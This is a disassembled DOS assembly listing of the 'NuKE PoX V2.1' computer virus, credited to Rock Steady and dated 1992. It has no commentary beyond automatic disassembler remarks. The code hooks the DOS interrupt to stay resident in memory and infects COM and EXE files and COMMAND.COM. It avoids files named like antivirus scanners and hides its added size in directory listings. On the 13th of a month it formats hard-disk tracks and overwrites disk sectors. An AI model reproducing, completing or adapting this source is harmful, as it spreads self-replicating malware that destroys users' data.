
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        NPOX21				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   28-Sep-92					         ÛÛ
;ÛÛ      Passes:    5	       Analysis Options on: none	         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e		equ	16h
data_2e		equ	3			;*
data_32e	equ	103h			;*
data_33e	equ	1			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

npox21		proc	far

start:
		jmp	short $+3		; delay for I/O
		nop
		call	sub_1

npox21		endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1		proc	near
		pop	bp
		sub	bp,106h
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	bp
		push	es
		push	ds
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dh=month
						;   dl=day, al=day-of-week 0=SUN
		cmp	dl,0Dh
		je	loc_2			; Jump if equal
		jmp	short loc_5
		db	90h
loc_2:
		mov	ch,0

locloop_3:
		mov	ah,5
		mov	dh,0
		mov	dl,80h
		int	13h			; Disk  dl=drive 0  ah=func 05h
						;  format track=ch or cylindr=cx
						;   al=interleave, dh=head
		inc	ch
		jc	loc_4			; Jump if carry Set
		cmp	ch,10h
		loopnz	locloop_3		; Loop if zf=0, cx>0

loc_4:
		mov	al,2
		mov	cx,20h
		mov	dx,0
		int	26h			; Absolute disk write, drive al
						;  if disk under 32MB, dx=start
						;    cx=#sectors, ds:bx=buffer
						;  else  cx=-1, ds:dx=parm block
;*		jmp	far ptr loc_66		;*
		db	0EAh,0F0h,0FFh,0FFh,0FFh
loc_5:
		mov	ax,0ABDCh
		int	21h			; ??INT Non-standard interrupt
		cmp	bx,0ABDCh
		je	loc_6			; Jump if equal
		push	cs
		pop	ds
		mov	cx,es
		mov	ax,3521h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	word ptr cs:data_10+2[bp],es
		mov	cs:data_10[bp],bx
		dec	cx
		mov	es,cx
		mov	bx,es:data_2e
		mov	dx,696h
		mov	cl,4
		shr	dx,cl			; Shift w/zeros fill
		add	dx,4
		mov	cx,es
		sub	bx,dx
		inc	cx
		mov	es,cx
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change memory allocation
						;   bx=bytes/16, es=mem segment
		jc	loc_6			; Jump if carry Set
		mov	ah,48h			; 'H'
		dec	dx
		mov	bx,dx
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		jc	loc_6			; Jump if carry Set
		dec	ax
		mov	es,ax
		mov	cx,8
		mov	es:data_33e,cx
		sub	ax,0Fh
		mov	di,data_32e
		mov	es,ax
		mov	si,bp
		add	si,103h
		mov	cx,696h
		cld				; Clear direction
		repne	movsb			; Rep zf=0+cx >0 Mov [si] to es:[di]
		mov	ax,2521h
;*		mov	dx,offset loc_65	;*
		db	0BAh, 8Eh, 02h
		push	es
		pop	ds
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
loc_6:
		push	cs
		pop	ds
		cmp	cs:data_21[bp],5A4Dh
		je	loc_7			; Jump if equal
		mov	bx,offset data_21
		add	bx,bp
		mov	ax,[bx]
		mov	word ptr ds:[100h],ax
		inc	bx
		inc	bx
		mov	al,[bx]
		mov	byte ptr ds:[102h],al
		pop	ds
		pop	es
		pop	bp
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		mov	ax,offset start
		push	ax
		retn
		db	'Death to Separatist'
		db	0
loc_7:
		mov	bx,word ptr cs:data_12[bp]
		mov	dx,cs
		sub	dx,bx
		mov	ax,dx
		add	ax,cs:data_14[bp]
		add	dx,cs:data_16[bp]
		mov	bx,cs:data_13[bp]
		mov	word ptr cs:[236h][bp],bx
		mov	word ptr cs:[238h][bp],ax
		mov	ax,cs:data_13[bp]
		mov	word ptr cs:[22Ch][bp],dx
		mov	word ptr cs:[232h][bp],ax
		pop	ds
		pop	es
		pop	bp
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		mov	ax,0
		cli				; Disable interrupts
		mov	ss,ax
		mov	sp,0
		sti				; Enable interrupts
;*		jmp	far ptr loc_1		;*
sub_1		endp

		db	0EAh, 00h, 00h, 00h, 00h
loc_8:
		call	sub_2
		test	al,al
		jnz	loc_ret_15		; Jump if not zero
		push	ax
		push	bx
		push	es
		mov	ah,51h			; 'Q'
		int	21h			; DOS Services  ah=function 51h
						;  get active PSP segment in bx
						;*  undocumented function
		mov	es,bx
		cmp	bx,es:data_1e
		jne	loc_14			; Jump if not equal
		mov	bx,dx
		mov	al,[bx]
		push	ax
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		pop	ax
		inc	al
		jnz	loc_13			; Jump if not zero
		add	bx,7
loc_13:
		mov	ax,es:[bx+17h]
		and	ax,1Fh
		cmp	al,1Eh
		jne	loc_14			; Jump if not equal
		and	byte ptr es:[bx+17h],0E0h
		sub	word ptr es:[bx+1Dh],696h
		sbb	word ptr es:[bx+1Fh],0
loc_14:
		pop	es
		pop	bx
		pop	ax

loc_ret_15:
		iret				; Interrupt return

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2		proc	near
		pushf				; Push flags
		call	dword ptr cs:data_10
		retn
sub_2		endp

		db	0EBh,0B0h
data_10		dw	0, 0			; Data table (indexed access)
		db	 80h,0FCh, 11h, 74h,0F5h, 80h
		db	0FCh, 12h, 74h,0F0h, 3Dh, 00h
		db	 4Bh, 74h, 27h, 80h,0FCh, 3Dh
		db	 74h, 12h, 80h,0FCh, 3Eh, 74h
		db	 15h, 3Dh,0DCh,0ABh, 75h, 02h
		db	 8Bh,0D8h

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_3		proc	near
		jmp	dword ptr cs:data_10
		db	0CBh
		db	0E8h,0BFh, 00h, 2Eh,0FFh, 2Eh
		db	 8Ah, 02h
		db	0E8h,0E1h, 00h, 2Eh,0FFh, 2Eh
		db	 8Ah, 02h
		db	0E8h,0ECh, 01h, 52h, 9Ch, 0Eh
		db	0E8h,0E1h,0FFh, 5Ah, 50h, 53h
		db	 51h, 52h, 1Eh,0E8h, 00h, 03h
		db	0E8h, 82h, 02h, 72h, 1Eh,0B8h
		db	 00h, 43h,0E8h,0A0h,0FFh, 72h
		db	 16h,0F6h,0C1h, 01h, 74h, 0Bh
		db	 80h,0E1h,0FEh,0B8h, 01h, 43h
		db	0E8h, 90h,0FFh
		db	 72h, 66h
loc_21:
		mov	ax,3D02h
		call	sub_2
loc_22:
		jc	loc_24			; Jump if carry Set
		mov	bx,ax
		call	sub_12
		jz	loc_24			; Jump if zero
		push	cs
		pop	ds
		mov	data_18,cx
		mov	data_19,dx
		mov	ah,3Fh			; '?'
		mov	cx,1Bh
		mov	dx,77Eh
		call	sub_2
		jc	loc_23			; Jump if carry Set
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_2
		jc	loc_23			; Jump if carry Set
		cmp	data_21,5A4Dh
		je	loc_25			; Jump if equal
		mov	cx,ax
		sub	cx,3
		mov	data_20,cx
		call	sub_6
		jc	loc_24			; Jump if carry Set
		mov	ah,40h			; '@'
		mov	dx,760h
		mov	cx,3
		call	sub_2
loc_23:
		mov	cx,data_18
		mov	dx,data_19
		mov	ax,5701h
		call	sub_2
		mov	ah,3Eh			; '>'
		call	sub_2
loc_24:
		pop	ds
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		iret				; Interrupt return
loc_25:
		call	sub_15
		jc	loc_24			; Jump if carry Set
		call	sub_16
		call	sub_13
		jmp	short loc_23
sub_3		endp

data_12		db	0, 0			; Data table (indexed access)
data_13		dw	0			; Data table (indexed access)
data_14		dw	0			; Data table (indexed access)
data_15		dw	0
data_16		dw	0			; Data table (indexed access)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_4		proc	near
		call	sub_8
		jnc	loc_26			; Jump if carry=0
		call	sub_9
		jnc	loc_26			; Jump if carry=0
		retn
loc_26:
		push	ax
		mov	ax,3D02h
		call	sub_2
		jnc	loc_27			; Jump if carry=0
		pop	ax
		iret				; Interrupt return
loc_27:
		push	bx
		push	cx
		push	dx
		push	ds
		mov	bx,ax
		call	sub_12
		jnz	loc_28			; Jump if not zero
		call	sub_17
loc_28:
		pop	ds
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
sub_4		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_5		proc	near
		cmp	bx,0
		je	loc_ret_29		; Jump if equal
		cmp	bx,5
		ja	loc_30			; Jump if above

loc_ret_29:
		retn
loc_30:
		push	ax
		push	bx
		push	cx
		push	dx
		push	di
		push	ds
		push	es
		push	bp
		push	bx
		mov	ax,1220h
		int	2Fh			; DOS Internal services
						;*  undocumented function
		mov	ax,1216h
		mov	bl,es:[di]
		int	2Fh			; DOS Internal services
						;*  undocumented function
		pop	bx
		add	di,11h
		mov	byte ptr es:[di-0Fh],2
		add	di,17h
		cmp	word ptr es:[di],4F43h
		jne	loc_31			; Jump if not equal
		cmp	byte ptr es:[di+2],4Dh	; 'M'
		jne	loc_34			; Jump if not equal
		jmp	short loc_35
		db	90h
loc_31:
		cmp	word ptr es:[di],5845h
		jne	loc_34			; Jump if not equal
		cmp	byte ptr es:[di+2],45h	; 'E'
		jne	loc_34			; Jump if not equal
		cmp	word ptr es:[di-8],4353h
		jne	loc_32			; Jump if not equal
		cmp	word ptr es:[di-6],4E41h
		je	loc_34			; Jump if equal
loc_32:
		cmp	word ptr es:[di-8],2D46h
		jne	loc_33			; Jump if not equal
		cmp	word ptr es:[di-6],5250h
		je	loc_34			; Jump if equal
loc_33:
		cmp	word ptr es:[di-8],4C43h
		jne	loc_35			; Jump if not equal
		cmp	word ptr es:[di-6],4145h
		jne	loc_35			; Jump if not equal
loc_34:
		jmp	short loc_37
		db	90h
loc_35:
		call	sub_12
		jz	loc_37			; Jump if zero
		push	cs
		pop	ds
		mov	data_18,cx
		mov	data_19,dx
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_2
		mov	ah,3Fh			; '?'
		mov	cx,1Bh
		mov	dx,77Eh
		call	sub_2
		jc	loc_36			; Jump if carry Set
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_2
		jc	loc_36			; Jump if carry Set
		cmp	data_21,5A4Dh
		je	loc_38			; Jump if equal
		mov	cx,ax
		sub	cx,3
		mov	data_20,cx
		call	sub_6
		jc	loc_36			; Jump if carry Set
		mov	ah,40h			; '@'
		mov	dx,760h
		mov	cx,3
		call	sub_2
loc_36:
		mov	cx,data_18
		mov	dx,data_19
		mov	ax,5701h
		call	sub_2
loc_37:
		pop	bp
		pop	es
		pop	ds
		pop	di
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
loc_38:
		call	sub_15
		jc	loc_36			; Jump if carry Set
		call	sub_16
		call	sub_13
		jmp	short loc_36
sub_5		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_6		proc	near
		mov	ah,40h			; '@'
		mov	dx,103h
		mov	cx,696h
		call	sub_2
		jc	loc_39			; Jump if carry Set
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_2
		jc	loc_39			; Jump if carry Set
		clc				; Clear carry flag
		retn
loc_39:
		stc				; Set carry flag
		retn
sub_6		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_7		proc	near
		push	ax
		push	bx
		push	cx
		push	dx
		push	ds
		mov	ax,4300h
		call	sub_2
		test	cl,1
		jz	loc_40			; Jump if zero
		and	cl,0FEh
		mov	ax,4301h
		call	sub_2
		jc	loc_41			; Jump if carry Set
loc_40:
		mov	ax,3D02h
		call	sub_2
		jc	loc_41			; Jump if carry Set
		mov	bx,ax
		call	sub_12
		jnz	loc_41			; Jump if not zero
		call	sub_17
loc_41:
		pop	ds
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
sub_7		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_8		proc	near
		push	si
		push	cx
		mov	si,dx
		mov	cx,256h

locloop_42:
		cmp	byte ptr [si],2Eh	; '.'
		je	loc_43			; Jump if equal
		inc	si
		loop	locloop_42		; Loop if cx > 0

loc_43:
		cmp	word ptr [si+1],4F43h
		jne	loc_44			; Jump if not equal
		cmp	byte ptr [si+3],4Dh	; 'M'
		je	loc_46			; Jump if equal
loc_44:
		cmp	word ptr [si+1],6F63h
		jne	loc_45			; Jump if not equal
		cmp	byte ptr [si+3],6Dh	; 'm'
		je	loc_46			; Jump if equal
loc_45:
		pop	cx
		pop	si
		stc				; Set carry flag
		retn
loc_46:
		pop	cx
		pop	si
		clc				; Clear carry flag
		retn
sub_8		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_9		proc	near
		push	si
		push	cx
		mov	si,dx
		mov	cx,256h

locloop_47:
		cmp	byte ptr [si],2Eh	; '.'
		je	loc_48			; Jump if equal
		inc	si
		loop	locloop_47		; Loop if cx > 0

loc_48:
		cmp	word ptr [si+1],5845h
		jne	loc_49			; Jump if not equal
		cmp	byte ptr [si+3],45h	; 'E'
		je	loc_51			; Jump if equal
loc_49:
		cmp	word ptr [si+1],7865h
		jne	loc_50			; Jump if not equal
		cmp	byte ptr [si+3],65h	; 'e'
		je	loc_51			; Jump if equal
loc_50:
		pop	cx
		pop	si
		stc				; Set carry flag
		retn
loc_51:
		pop	cx
		pop	si
		clc				; Clear carry flag
		retn
sub_9		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_10		proc	near
		push	bx
		push	cx
		mov	cl,0Ch
		shl	dx,cl			; Shift w/zeros fill
		xchg	ax,bx
		mov	cl,4
		shr	bx,cl			; Shift w/zeros fill
		and	ax,0Fh
		add	dx,bx
		pop	cx
		pop	bx
		retn
sub_10		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_11		proc	near
		push	si
		push	cx
		mov	si,dx
		mov	cx,256h

locloop_52:
		cmp	byte ptr [si],2Eh	; '.'
		je	loc_53			; Jump if equal
		inc	si
		loop	locloop_52		; Loop if cx > 0

loc_53:
		cmp	word ptr [si-2],4E41h
		jne	loc_54			; Jump if not equal
		cmp	word ptr [si-4],4353h
		je	loc_57			; Jump if equal
loc_54:
		cmp	word ptr [si-2],4E41h
		jne	loc_55			; Jump if not equal
		cmp	word ptr [si-4],454Ch
		je	loc_57			; Jump if equal
loc_55:
		cmp	word ptr [si-2],544Fh
		jne	loc_56			; Jump if not equal
		cmp	word ptr [si-4],5250h
		je	loc_57			; Jump if equal
loc_56:
		pop	cx
		pop	si
		clc				; Clear carry flag
		retn
loc_57:
		pop	cx
		pop	si
		stc				; Set carry flag
		retn
sub_11		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_12		proc	near
		mov	ax,5700h
		call	sub_2
		mov	al,cl
		or	cl,1Fh
		dec	cx
		xor	al,cl
		retn
sub_12		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_13		proc	near
		push	bx
		push	cx
		mov	cl,7
		shl	dx,cl			; Shift w/zeros fill
		mov	bx,ax
		mov	cl,9
		shr	bx,cl			; Shift w/zeros fill
		add	dx,bx
		and	ax,1FFh
		jz	loc_58			; Jump if zero
		inc	dx
loc_58:
		pop	cx
		pop	bx
		mov	cs:data_22,ax
		mov	cs:data_24,dx
		mov	ah,40h			; '@'
		mov	dx,77Eh
		mov	cx,1Bh
		call	sub_2
		retn
sub_13		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_14		proc	near
		pushf				; Push flags
		push	ax
		push	bx
		push	cx
		push	dx
		push	ds
		push	es
		push	ss
		push	sp
		push	cs
		pop	ds
		mov	dx,74Bh
		mov	ax,4300h
		call	sub_2
		jc	loc_60			; Jump if carry Set
		test	cl,1
		jz	loc_59			; Jump if zero
		and	cl,0FEh
		mov	ax,4301h
		call	sub_2
		jc	loc_62			; Jump if carry Set
loc_59:
		mov	ax,3D02h
		call	sub_2
loc_60:
		jc	loc_62			; Jump if carry Set
		mov	bx,ax
		call	sub_12
		jz	loc_62			; Jump if zero
		mov	data_18,cx
		mov	data_19,dx
		mov	ah,3Fh			; '?'
		mov	cx,3
		mov	dx,77Eh
		call	sub_2
		jc	loc_61			; Jump if carry Set
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_2
		jc	loc_62			; Jump if carry Set
		mov	cx,ax
		sub	cx,3
		mov	data_20,cx
		call	sub_6
		jc	loc_62			; Jump if carry Set
		mov	ah,40h			; '@'
		mov	dx,760h
		mov	cx,3
		call	sub_2
loc_61:
		mov	cx,data_18
		mov	dx,data_19
		mov	ax,5701h
		call	sub_2
		mov	ah,3Eh			; '>'
		call	sub_2
loc_62:
		pop	sp
		pop	ss
		pop	es
		pop	ds
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		popf				; Pop flags
		retn
sub_14		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_15		proc	near
		mov	cx,cs:data_28
		mov	cs:data_13,cx
		mov	cx,cs:data_29
		mov	cs:data_14,cx
		mov	cx,cs:data_27
		mov	cs:data_15,cx
		mov	cx,cs:data_26
		mov	cs:data_16,cx
		push	ax
		push	dx
		call	sub_10
		sub	dx,cs:data_25
		mov	word ptr cs:data_12,dx
		push	ax
		push	dx
		call	sub_6
		pop	dx
		pop	ax
		mov	cs:data_29,dx
		mov	cs:data_28,ax
		pop	dx
		pop	ax
		retn
sub_15		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_16		proc	near
		add	ax,696h
		adc	dx,0
		push	ax
		push	dx
		call	sub_10
		sub	dx,cs:data_25
		add	ax,40h
		mov	cs:data_26,dx
		mov	cs:data_27,ax
		pop	dx
		pop	ax
		retn
sub_16		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_17		proc	near
		dec	cx
		mov	cs:data_18,cx
		mov	cs:data_19,dx
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_2
		mov	cx,dx
		mov	dx,ax
		push	cx
		push	dx
		sub	dx,1Bh
		sbb	cx,0
		mov	ax,4200h
		call	sub_2
		push	cs
		pop	ds
		mov	ah,3Fh			; '?'
		mov	cx,1Bh
		mov	dx,77Eh
		call	sub_2
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		mov	ax,4200h
		call	sub_2
		mov	ah,40h			; '@'
		mov	dx,77Eh
		mov	cx,1Bh
		cmp	cs:data_21,5A4Dh
		je	loc_64			; Jump if equal
		mov	cx,3
loc_64:
		call	sub_2
		pop	dx
		pop	cx
		sub	dx,696h
		sbb	cx,0
		mov	ax,4200h
		call	sub_2
		mov	ah,40h			; '@'
		xor	cx,cx			; Zero register
		call	sub_2
		mov	cx,cs:data_18
		mov	dx,cs:data_19
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
		mov	ah,3Eh			; '>'
		call	sub_2
		retn
sub_17		endp

		db	'C:\COMMAND.COM'
		db	0
data_18		dw	0
data_19		dw	0
		db	 00h, 00h,0E9h
data_20		dw	9090h
		db	'NuKE PoX V2.1 - Rock Steady'
data_21		dw	0CD90h			; Data table (indexed access)
data_22		dw	20h
data_24		dw	0
		db	0, 0
data_25		dw	0
		db	0, 0, 0, 0
data_26		dw	0
data_27		dw	0
		db	0, 0
data_28		dw	0
data_29		dw	0
		db	0, 0, 0

seg_a		ends



		end	start
